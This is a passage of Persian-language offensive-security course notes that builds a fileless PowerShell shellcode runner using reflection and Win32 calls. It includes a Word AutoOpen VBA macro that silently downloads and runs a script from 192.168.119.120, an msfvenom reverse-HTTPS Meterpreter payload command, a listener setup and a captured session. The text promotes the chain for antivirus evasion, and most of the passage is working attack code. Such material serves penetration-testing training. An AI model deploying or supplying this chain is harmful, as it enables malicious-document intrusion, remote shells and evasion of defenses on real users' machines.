    @([IntPtr], [String], [String], [int]))

$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',
    'Public, HideBySig, NewSlot, Virtual',
    [int],
    @([IntPtr], [String], [String], [int]))

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

$MyDelegateType = $MyTypeBuilder.CreateType()

$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)

$MyFunction.Invoke([IntPtr]::Zero, "Hello World", "This is My MessageBox", 0)
```

---

## مزایا

- **هیچ فایلی روی دیسک نوشته نمی‌شود**
- **بدون استفاده از csc.exe**
- **اجرای کامل در حافظه**
- **دور زدن آنتی‌ویروس**

---

## گام بعدی

استفاده از این تکنیک برای ساخت **Shellcode Runner** که کاملاً در حافظه اجرا شود و از طریق Word macro فراخوانی گردد.


# Shellcode Runner کامل با Reflection در PowerShell

این بخش نسخه نهایی و بهینه‌شده shellcode runner را ارائه می‌دهد که **کاملاً در حافظه** اجرا می‌شود.

---

## بهینه‌سازی: تابع getDelegateType

برای فراخوانی چندین Win32 API (VirtualAlloc, CreateThread, WaitForSingleObject)، کد ساخت delegate type به یک تابع قابل استفاده مجدد تبدیل می‌شود:

```powershell
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate])
    
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')
    
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')
    
    return $type.CreateType()
}
```

### پارامترها:
- **`$func`**: آرایه‌ای از انواع آرگومان‌های تابع Win32
- **`$delType`**: نوع بازگشتی (پیش‌فرض `[Void]`)

---

## نسخه فشرده: فراخوانی VirtualAlloc

### نسخه اولیه (با متغیرهای جداگانه):
```powershell
$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

### نسخه بهینه (تک‌خطی):
```powershell
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

---

## Shellcode Runner کامل

### مراحل:
1. **تخصیص حافظه** با `VirtualAlloc`
2. **کپی shellcode** با `Marshal.Copy`
3. **ایجاد thread** با `CreateThread`
4. **انتظار برای اتمام** با `WaitForSingleObject`

### کد کامل:

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And 
        $_.Location.Split('\\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") {$tmp += $_}
    }
    
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate])
    
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')
    
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')
    
    return $type.CreateType()
}

# تخصیص حافظه
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Shellcode (32-bit برای Word)
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

# کپی به حافظه
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# ایجاد thread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# انتظار برای اتمام
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
).Invoke($hThread, 0xFFFFFFFF)
```

---

## ادغام با VBA Macro

### فایل `run.ps1` روی سرور Apache:
```powershell
# کد کامل بالا را در این فایل قرار دهید
```

### VBA Macro (بدون تغییر):
```vba
Sub AutoOpen()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub
```

---

## تولید Shellcode

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 \
    EXITFUNC=thread -f ps1 -a x86
```

**نکته مهم:** از معماری **32-bit** (`-a x86`) استفاده کنید چون PowerShell از Word به صورت 32-bit اجرا می‌شود.

---

## تست و تأیید

### راه‌اندازی Listener:
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 192.168.119.120; set LPORT 443; exploit"
```

### نتیجه موفق:
[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] Meterpreter session 1 opened
meterpreter >


### بررسی با Process Monitor:
- **هیچ فایل `.cs`** نوشته نمی‌شود
- **هیچ فایل `.dll`** کامپایل نمی‌شود
- **`csc.exe` اجرا نمی‌شود**

---

## مزایای این روش

1. **اجرای کامل در حافظه** - بدون نوشتن روی دیسک
2. **دور زدن آنتی‌ویروس** - عدم ایجاد artifacts
3. **جداسازی payload** - shellcode روی سرور وب، نه در macro
4. **انعطاف‌پذیری** - تغییر `run.ps1` بدون نیاز به ویرایش سند Word

---

## تمرین‌ها

### 1. تولید Meterpreter و دریافت Shell:
```bash
# تولید shellcode
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 \
    EXITFUNC=thread -f ps1 -a x86 > shellcode.txt

# جایگزینی در run.ps1
# راه‌اندازی listener
# باز کردن سند Word
```

### 2. تبدیل به 64-bit:

**تغییرات لازم:**
- تولید shellcode با `-a x64`
- استفاده از PowerShell 64-bit
- تغییر اندازه‌های pointer (اگر لازم باشد)
- تست با Process Explorer برای تأیید معماری

**نکته:** برای اجرای 64-bit از Word، باید از روش‌های دیگری برای spawn کردن PowerShell 64-bit استفاده کرد (مثلاً `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`).


## 3.7 Talking To The Proxy

